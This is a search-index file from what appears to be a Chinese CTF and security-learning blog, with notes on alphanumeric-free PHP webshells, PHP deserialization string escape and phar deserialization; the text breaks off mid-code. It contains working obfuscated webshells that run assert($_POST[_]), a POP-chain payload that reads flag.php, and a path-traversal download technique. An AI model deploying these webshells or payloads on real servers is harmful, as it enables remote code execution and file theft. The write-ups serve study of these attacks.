<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>XSS(1)</title>
    <link href="/2020/06/21/XSS-1/"/>
    <url>/2020/06/21/XSS-1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>blind xxe</title>
    <link href="/2020/06/17/blind-xxe/"/>
    <url>/2020/06/17/blind-xxe/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>XML</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>原型链污染</title>
    <link href="/2020/05/12/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2020/05/12/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字的webshell</title>
    <link href="/2020/05/04/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell/"/>
    <url>/2020/05/04/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%9A%84webshell/</url>
    
    <content type="html"><![CDATA[<p>在做文件上传或者命令执行的题的时候经常会遇到禁用字母和数字的题目，所以我这里学习记录一下：<br>虽然禁用了字母和数字，但是我们可以利用一些特殊的运算符，来将一些字符组合成字母和数字</p><!-- toc --><h3 id="异或构造"><a href="#异或构造" class="headerlink" title="异或构造"></a>异或构造</h3><p>所以首先我们来了解一下php中的异或的概念：<br>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串<br>比如我们想要构造字母A，A的ascii值为65，对应的二进制数为：1000001，我们就可以用字符：{和:来构造，{的ascii码值对应的二进制为：1111011。而<br>:对应的二进制为0111010,两个进行异或操作之后为1000001也就是字母A，我们也可以用同样的方法去构造其他字母（对于有些不可打印字符可以用url编码表示），类似于异或，我们同样也可以用其他运算符;比如取反来构造字母，下面是个典型的用异或来构造无字母的webshell</p><pre><code class="hljs awk">&lt;?php<span class="hljs-variable">$_</span>=(<span class="hljs-string">'%1'</span>^<span class="hljs-string">'`'</span>).(<span class="hljs-string">'%19'</span>^<span class="hljs-string">'`'</span>).(<span class="hljs-string">'%19'</span>^<span class="hljs-string">'`'</span>).(<span class="hljs-string">'%5'</span>^<span class="hljs-string">'`'</span>).(<span class="hljs-string">'%18'</span>^<span class="hljs-string">'`'</span>).(<span class="hljs-string">'20'</span>^<span class="hljs-string">'`'</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">'assert'</span>;<span class="hljs-variable">$__</span>=<span class="hljs-string">'_'</span>.(<span class="hljs-string">'%13'</span>^<span class="hljs-string">']'</span>).(<span class="hljs-string">'%47'</span>^<span class="hljs-string">'`'</span>).(<span class="hljs-string">'%14'</span>^<span class="hljs-string">']'</span>).(<span class="hljs-string">'%9'</span>^<span class="hljs-string">']'</span>); <span class="hljs-regexp">//</span> <span class="hljs-variable">$__</span>=<span class="hljs-string">'_POST'</span>;<span class="hljs-variable">$___</span>=$<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-regexp">//</span> assert(<span class="hljs-variable">$_POST</span>[_]);</code></pre><!-- toc --><h3 id="自增运算符构造"><a href="#自增运算符构造" class="headerlink" title="自增运算符构造"></a>自增运算符构造</h3><p>如果不能用位运算符，如何构造一个没有字母和数字的webshell，我们可以考虑自增运算符，PHP中未定义的变量默认值为null,null==false==0,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。那如何通过自增运算符的到字符呢。一直’a’++=‘b’，所以我们如果能得到字母a就可以通过自增得到其他25个字母，字母a我们可以通过数组（Array）第一个大写的字母A和第四个小写字母a得到，通过$<em>=@”$</em>“即可得到字符串Arrary再通过<br>$_[‘!’==’@’]（‘!’==’@’表示假也就是0）得到第一个字母也就是大写的A.用自增运算符构造的webshell：</p><pre><code class="hljs awk">&lt;?php<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">"$_"</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">'Array'</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">'!'</span>==<span class="hljs-string">'@'</span>]; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-regexp">//</span> A<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$___</span>=AS<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$___</span>=ASS<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> E <span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$___</span>=ASSE<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> R<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$___</span>=ASSER<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$___</span>=ASSERT<span class="hljs-variable">$____</span>=<span class="hljs-string">'_'</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> P<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$____</span>=_P<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> O<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$____</span>=_PO<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> S<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$____</span>=_POS<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$____</span>=_POST<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-regexp">//</span><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_POST</span><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-regexp">//</span> ASSERT(<span class="hljs-variable">$_POST</span>[_])</code></pre><!-- toc --><h3 id="更一般的情况"><a href="#更一般的情况" class="headerlink" title="更一般的情况"></a>更一般的情况</h3><p>1.补充有些题目会过滤;号，可以用短标签&lt;&gt;绕过<br>2.当字母、$、引号、异或都被过滤时<br>在php7中可以通过(‘func’)();来执行函数，例如(‘phpinfo’)(),另外两个括号中都可以是表达式，第一个括号中是函数，第二个就是参数了。函数嵌套就是 (f1)(f2(arg))<br>具体应用:0/0的结果为NAN,所以可以通过((0/0).(0)){0}来得到字母N，同理((0/0).(0)){1}得到字母A，((0/0).(1-9)){3}可以得到数字1-9<br>再比如999**999结果为INF，所以可与通过((999**999).(0)){0}来得到字母I,((999**999).(0)){2}得到字母F，还有<br>99**99的结果为3.6972963764973E+197,所以可以通过<br>((99**99).(0)){15}来得到字母E，之后就可以通过不断地：取反~、和运算&amp;、或运算|，得到全部 256 个字符。</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'0'</span>)</span></span>: <span class="hljs-string">'((0/0).(0))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'1'</span>)</span></span>: <span class="hljs-string">'((0/0).(1))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'2'</span>)</span></span>: <span class="hljs-string">'((0/0).(2))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'3'</span>)</span></span>: <span class="hljs-string">'((0/0).(3))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'4'</span>)</span></span>: <span class="hljs-string">'((0/0).(4))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'5'</span>)</span></span>: <span class="hljs-string">'((0/0).(5))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'6'</span>)</span></span>: <span class="hljs-string">'((0/0).(6))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'7'</span>)</span></span>: <span class="hljs-string">'((0/0).(7))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'8'</span>)</span></span>: <span class="hljs-string">'((0/0).(8))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'9'</span>)</span></span>: <span class="hljs-string">'((0/0).(9))&#123;3&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'N'</span>)</span></span>: <span class="hljs-string">'((0/0).(0))&#123;0&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'A'</span>)</span></span>: <span class="hljs-string">'((0/0).(0))&#123;1&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'I'</span>)</span></span>: <span class="hljs-string">'((99**999).(0))&#123;0&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'F'</span>)</span></span>: <span class="hljs-string">'((99**999).(0))&#123;2&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'E'</span>)</span></span>: <span class="hljs-string">'((99**99).(0))&#123;15&#125;'</span>,<span class="hljs-function"><span class="hljs-title">ord</span><span class="hljs-params">(<span class="hljs-string">'-'</span>)</span></span>: <span class="hljs-string">'((-1).(0))&#123;0&#125;'</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>反序列化字符串逃逸</title>
    <link href="/2020/04/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
    <url>/2020/04/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p>首先拿安恒4月的月赛一道反序列化来当例子，这里记录学习一下<br>先看一下源码：</p><pre><code class="hljs xml"> <span class="php"><span class="hljs-meta">&lt;?php</span>show_source(<span class="hljs-string">"index.php"</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span><span class="hljs-params">($data)</span> </span>&#123;    <span class="hljs-keyword">return</span> str_replace(chr(<span class="hljs-number">0</span>) . <span class="hljs-string">'*'</span> . chr(<span class="hljs-number">0</span>), <span class="hljs-string">'\0\0\0'</span>, $data);&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span><span class="hljs-params">($data)</span> </span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'\0\0\0'</span>, chr(<span class="hljs-number">0</span>) . <span class="hljs-string">'*'</span> . chr(<span class="hljs-number">0</span>), $data);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $username;    <span class="hljs-keyword">public</span> $password;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($a, $b)</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = $a;        <span class="hljs-keyword">$this</span>-&gt;password = $b;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;    <span class="hljs-keyword">public</span> $b = <span class="hljs-string">'gqy'</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;        $c = <span class="hljs-string">'a'</span>.<span class="hljs-keyword">$this</span>-&gt;b;        <span class="hljs-keyword">echo</span> $c;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;    <span class="hljs-keyword">public</span> $c;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-comment">//flag.php</span>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;c);        <span class="hljs-keyword">return</span> <span class="hljs-string">'nice'</span>;    &#125;&#125;$a = <span class="hljs-keyword">new</span> A($_GET[<span class="hljs-string">'a'</span>],$_GET[<span class="hljs-string">'b'</span>]);<span class="hljs-comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span>$b = unserialize(read(write(serialize($a))));</span></code></pre><p>首先看到C类中的_tostring方法中有file_get_contents函数，肯定是用来读取源码的，又看到B类中有echo所以可以让，属性$b实例化为对象C即可触发_tostring方法，<br>而题目只有对A对象的实例化，因此需要将A的属性实例化为B，这样pop链就构造完成了：</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $username;    <span class="hljs-keyword">public</span> $password;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($a, $b)</span></span>&#123;        <span class="hljs-keyword">$this</span>-&gt;username = $a;        <span class="hljs-keyword">$this</span>-&gt;password = $b;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;    <span class="hljs-keyword">public</span> $b;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;        $c = <span class="hljs-string">'a'</span>.<span class="hljs-keyword">$this</span>-&gt;b;        <span class="hljs-keyword">echo</span> $c;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;    <span class="hljs-keyword">public</span> $c = <span class="hljs-string">'flag.php'</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-comment">//flag.php</span>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;c);        <span class="hljs-keyword">return</span> <span class="hljs-string">'nice'</span>;    &#125;&#125;$a = <span class="hljs-keyword">new</span> A();$b = <span class="hljs-keyword">new</span> B();$c = <span class="hljs-keyword">new</span> C();$b-&gt;b=$c;<span class="hljs-comment">// echo serialize($b);</span>$a-&gt;password=$b;$a-&gt;username=<span class="hljs-string">"123"</span>;<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></span></code></pre><p>我们得到了初步的paylaod:</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"B"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">"b"</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"C"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">"c"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"flag.php"</span>;&#125;&#125;&#125;</code></pre><p>，之后看到read()和write()函数的源码，我们要考虑字符逃逸，这里write函数将字符串<br>中的chr(0) . ‘*’ . chr(0)进行替换成\0\0\0，这是就变成了6个字符，然后read函数又把他替换回来，又从6个字符变成了3个字符，而字符长度标识不变，所以进行反序列化<br>的时候会继续向后读取到满足字符串长度标识为止，，所以我们将构造pop链的paylaod当作password的字段值的第二部分，将username和paswword的前半部分利用这两个函数溢出，就留下<br>payload成功溢出并且被反序列化后执行<br>payload</p><pre><code class="hljs lsl">?a=\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>&amp;b=A<span class="hljs-string">";s:8:"</span>password<span class="hljs-string">";O:1:"</span>B<span class="hljs-string">":1:&#123;s:1:"</span>b<span class="hljs-string">";O:1:"</span>C<span class="hljs-string">":1:&#123;s:1:"</span>c<span class="hljs-string">";s:8:"</span>flag.php<span class="hljs-string">";&#125;&#125;</span></code></pre><p>这样会得到序列化之后的字符串为</p><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"username"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">48</span>:<span class="hljs-string">"********"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">86</span>:<span class="hljs-string">"A"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"B"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">"b"</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">"C"</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">"c"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">"flag.php"</span>;&#125;&#125;&#125;</code></pre><p>24个\0经过一次write函数之后，字符串长度标识为54，但是经过一次read之后长度减半，所以他需要继续往后读24个而;s:8:”password”;s:86:”A”长度刚好为24个所以剩下<br>;s:8:”password”;O:1:”B”:1:{s:1:”b”;O:1:”C”:1:{s:1:”c”;s:8:”flag.php”;}}成功逃逸出去，也正是我们用来读取flag.php构造的pop链，这里我写wp的时候环境已经关了，所以我本地<br>重新搭建了一个：<br><img src="https://github.com/gee617/picture/raw/master/%E6%8D%95%E8%8E%B7200.JPG" srcset="/img/loading.gif" alt="picture"><br>在这题的基础上，我们来复现一下Joomla3.4.6的漏洞</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/2020/04/13/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/04/13/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<!-- toc --><h3 id="phar原理"><a href="#phar原理" class="headerlink" title="phar原理"></a>phar原理</h3><p>phar扩展提供了一种将整个PHP应用程序放入称为“ phar”（PHP存档）的单个文件中的方法，以便于分发和安装。 除了提供此服务外，phar扩展还提供了一种文件格式抽象方法，用于通过PharData类创建和处理tar和zip文件，就像PDO提供了用于访问不同数据库的统一接口一样。 与无法在不同数据库之间进行转换的PDO不同，Phar还可以使用单行代码在tar，zip和phar文件格式之间进行转换。 有关一个示例，请参见Phar :: convertToExecutable（）。</p><p> Phar归档文件最有特色的特点是可以方便地将多个文件分组为一个文件。 这样，phar存档提供了一种在单个文件中分发完整的PHP应用程序并从该文件运行它的方法，而无需将其提取到磁盘。 此外，PHP可以像在命令行上和从Web服务器上的任何其他文件一样轻松地执行phar存档。 Phar有点像PHP应用程序的拇指驱动器。</p><p>Phar通过Stream Wrapper实现此功能。 通常，要在PHP脚本中使用外部文件，应使用include(翻译自手册)<br>下面是个生成phar文件的基本步骤，我们来分析一下</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;    &#125;    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>    $phar-&gt;startBuffering();    $phar-&gt;setStub(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>    $o = <span class="hljs-keyword">new</span> TestObject();    $o -&gt; data=<span class="hljs-string">'geer'</span>;    $phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>    $phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>    <span class="hljs-comment">//签名自动计算</span>    $phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></span></code></pre><p>首先php内置了一个Phar类来处理相关操作，然后就是设置一个标志位也就是setStub，基本格式为xxx<?php xxx;__HALT_COMPILER();?>，前面内容不限<br>但是要以__HALT_COMPILER();?&gt;结尾，由于前面的内容没有要求，我们可以通过更改前面的内容来伪造其他类型的文件，例如GIF89a’.’<?php __HALT_COMPILER();?>，就可以将phar文件伪造成一个GIF文件，以此来绕过题目中的一些限制，然后addFromString就是添加一些压缩文件，最重要的就是setMetadata，它会将我们自定义的meta-data对象信息，存入manifest中，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化主要的受影响函数有：<br>fileatime() file_put_contents() fileinode() is_dir() is_readable() copy() file_exists()，fopen()，file_get_contents()，file() 等一系列文件操作函数，利用这些函数，使用phar://执行代码，达成我们的目的</p><!-- toc --><h3 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h3><p>这里用一道phar的题目来分析一下，这是CISCN2019 华北赛区的一道题，首先进去要我们注册，注册号账号之后进去，有个文件上传，并且可以y下载文件，于是猜想可能会有任意文件下载漏洞，抓包之后发现了filename参数，尝试用目录穿越../../index.php去下载index.php，结果成成功了，所以用同样的方法拿到了，delete.php，class.php,download.php的源码，接下来就是代码审计。这里主要看一下class.php的内容</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$dbaddr = <span class="hljs-string">"127.0.0.1"</span>;$dbuser = <span class="hljs-string">"root"</span>;$dbpass = <span class="hljs-string">"root"</span>;$dbname = <span class="hljs-string">"dropbox"</span>;$db = <span class="hljs-keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> $db;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">global</span> $db;        <span class="hljs-keyword">$this</span>-&gt;db = $db;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span><span class="hljs-params">($username)</span> </span>&#123;        $stmt = <span 